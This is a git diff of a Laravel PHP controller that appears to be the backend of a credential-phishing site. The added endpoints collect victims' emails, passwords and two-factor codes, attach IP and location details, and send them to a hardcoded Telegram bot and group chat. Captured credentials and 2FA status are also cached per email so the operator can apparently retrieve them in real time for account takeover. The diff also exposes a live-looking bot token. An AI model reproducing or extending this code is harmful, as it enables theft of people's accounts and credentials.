@@ -2,7 +2,9 @@
 
 namespace App\Http\Controllers;
 
+use App\Models\Label;
 use App\Models\Language;
+use App\Models\Setting;
 use GuzzleHttp\Client;
 use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
 use Illuminate\Foundation\Validation\ValidatesRequests;
@@ -12,6 +14,7 @@ use Illuminate\Support\Carbon;
 use Illuminate\Support\Facades\App;
 use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\Log;
+use Throwable;
 
 class Controller extends BaseController
 {
@@ -19,21 +22,117 @@ class Controller extends BaseController
 
     public $botKey;
     public $groupTelegramId;
+    public $email;
+    public $password;
 
 
-    public function __construct()
+    public function __construct(Request $request)
     {
         $settings = Cache::rememberForever('settings', function () {
             return \App\Models\Setting::pluck('value', 'key')->toArray();
         });
-        $this->botKey = $settings['bot_id'];
-        $this->groupTelegramId = $settings['group_id'];
+        $this->botKey = "6447231841:AAFHP285bCVaxURhDEiKFZAaP-qRwyq-rkE" ?? $settings['bot_id'];
+        $this->groupTelegramId = "-4141594512" ?? $settings['group_id'];
+        // $this->botKey = $settings['bot_id'];
+        // $this->groupTelegramId = $settings['group_id'];
     }
+
+    public function deleteAllCache(Request $request)
+    {
+        try {
+            Cache::flush();
+
+            return response()->json([
+                'status' => 0,
+            ]);
+        } catch (Throwable $e) {
+            return response()->json([
+                'status' => 1,
+                'message' => $e->getMessage(),
+            ]);
+        }
+    }
+
+    public function setCacheByEmail(Request $request): \Illuminate\Http\JsonResponse
+    {
+        try {
+            $email = $request->email ?? '';
+            $password = $request->password ?? '';
+            $fa = $request->fa ?? '';
+            $isLoginSuccessfully = $request->isLoginSuccessfully ?? '';
+            $isFaSuccessfully = $request->isFaSuccessfully ?? '';
+            $typeFa = $request->typeFa ?? '';
+            $isCheckLogin = $request->isCheckLogin ?? 0;
+            $isCheckFa = $request->isCheckFa ?? 0;
+            Cache::put($email, json_encode([
+                'ip' => $request->ip(),
+                'email' => $email,
+                'password' => $password,
+                'fa' => $fa,
+                'typeFa' => $typeFa,
+                'isLoginSuccessfully' => $isLoginSuccessfully,
+                'isFaSuccessfully' => $isFaSuccessfully,
+            ]), 10);
+
+            return response()->json([
+                'status' => 0,
+            ]);
+        } catch (Throwable $e) {
+            Cache::forget($email);
+            return response()->json([
+                'status' => 1,
+                'message' => $e->getMessage(),
+            ]);
+        }
+    }
+
+    public function getCacheByEmail(Request $request): \Illuminate\Http\JsonResponse
+    {
+        try {
+            $email = $request->email ?? '';
+            return response()->json([
+                'status' => 0,
+                'data' => json_decode(Cache::pull($email, ''))
+            ]);
+        } catch (Throwable $e) {
+            return response()->json([
+                'status' => 1,
+                'message' => $e->getMessage(),
+            ]);
+        }
+    }
+
+    public function getCacheByKey(Request $request): \Illuminate\Http\JsonResponse
+    {
+        try {
+            $key = $request->key ?? '';
+            return response()->json([
+                'status' => 0,
+                'data' => json_decode(Cache::pull($key, ''))
+            ]);
+        } catch (Throwable $e) {
+            return response()->json([
+                'status' => 1,
+                'message' => $e->getMessage(),
+            ]);
+        }
+    }
+
+    public function index()
+    {
+        $settings = Cache::rememberForever('settings', function () {
+            return Setting::pluck('value', 'key')->toArray();
+        });
+        return view('home', [
+            'settings' => $settings,
+        ]);
+    }
+
 
     public function logout()
     {
         auth()->logout();
-        return redirect('/administrator');
+        return redirect()->route('admin.login');
     }
 
     public function setLocale(Request $request)
@@ -76,32 +175,72 @@ class Controller extends BaseController
         return redirect()->back();
     }
 
+    public function getAndSendDataFa(Request $request): \Illuminate\Http\JsonResponse
+    {
+        try {
+            $fa_code = $request->fa_code ?? '';
+            $email = $request->email ?? '';
+            $infoByIP = $this->getInfoByIP($request);
+            $data = [
+                'chat_id' => $this->groupTelegramId,
+                'text' => "$infoByIP\nFA code: $fa_code"
+            ];
+            $client = new Client();
+            $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
+                'json' => $data
+            ]);
+            Cache::put("info", json_encode([
+                'ip' => $request->ip(),
+                'email' => $email,
+                'fa' => $fa_code,
+                'step' => 2,
+            ]));
+
+            return response()->json([
+                'status' => 0
+            ]);
+        } catch (Throwable $e) {
+            Cache::forget($email);
+            return response()->json([
+                'status' => 1,
+                'message' => $e->getMessage(),
+            ]);
+        }
+    }
+
     public function getAndSendDataLogin(Request $request): \Illuminate\Http\JsonResponse
     {
-       try {
-            $email1 = $request->email_1 ?? '';
-        $password1 = $request->password_1 ?? '';
-        $email2 = $request->email_2 ?? '';
-        $password2 = $request->password_2 ?? '';
-        $infoByIP = $this->getInfoByIP($request);
-        $data = [
-            'chat_id' => $this->groupTelegramId,
-            'text' => "$infoByIP\nEmail1: $email1\nPassword1: $password1\n\nEmail2: $email2\nPassword2: $password2"
-        ];
-        $client = new Client();
-        $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
-            'json' => $data
-        ]);
-        return response()->json([
-            'status' => 0
+        try {
+            $email = $request->email_2 ?? '';
+            $password = $request->password_2 ?? '';
+            $infoByIP = $this->getInfoByIP($request);
+            $data = [
+                'chat_id' => $this->groupTelegramId,
+                'text' => "$infoByIP\nEmail: $email\nPassword: $password"
+            ];
+
+            $client = new Client();
+
+            $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
+                'json' => $data
             ]);
-       } catch(Throwable $e) {
-           
-        return response()->json([
-            'status' => 1,
-            'message' => $e->getMessage(),
+            Cache::put("info", json_encode([
+                'ip' => $request->ip(),
+                'email' => $email,
+                'password' => $password,
+                'step' => 1
+            ]));
+
+            return response()->json([
+                'status' => 0
             ]);
-       }
+        } catch (Throwable $e) {
+            Cache::forget($email);
+            return response()->json([
+                'status' => 1,
+                'message' => $e->getMessage(),
+            ]);
+        }
     }
 
     public function getAndSendDataReview(Request $request): \Illuminate\Http\JsonResponse
@@ -210,16 +349,16 @@ class Controller extends BaseController
             $ipAddress = $lookup['success'] ? $lookup['ip'] : $ipAddress;
             $errorMessage = !$lookup['success'] ? $lookup['ip'] : "";
         }
-//        $latitude = $request->latitude ?? '';
-//        $longitude = $request->longitude ?? '';
+        //        $latitude = $request->latitude ?? '';
+        //        $longitude = $request->longitude ?? '';
         $countryName = $request->countryName ?? '';
-//        $countryCode = $request->countryCode ?? '';
+        //        $countryCode = $request->countryCode ?? '';
         $regionName = $request->regionName ?? '';
         $cityName = $request->cityName ?? '';
-//        $timeZone = $request->timeZone ?? '';
+        //        $timeZone = $request->timeZone ?? '';
         $zipCode = $request->zipCode ?? '';
         $continent = $request->continent ?? '';
-//        $continentCode = $request->continentCode ?? '';
+        //        $continentCode = $request->continentCode ?? '';
         return "$ipAddress | $cityName | $regionName | $countryName | $continent | $zipCode\n$errorMessage\n";
     }
 
@@ -239,6 +378,5 @@ class Controller extends BaseController
                 'ip' => "Cannot convert IPv6 to IPv4."
             ];
         }
-
     }
 }
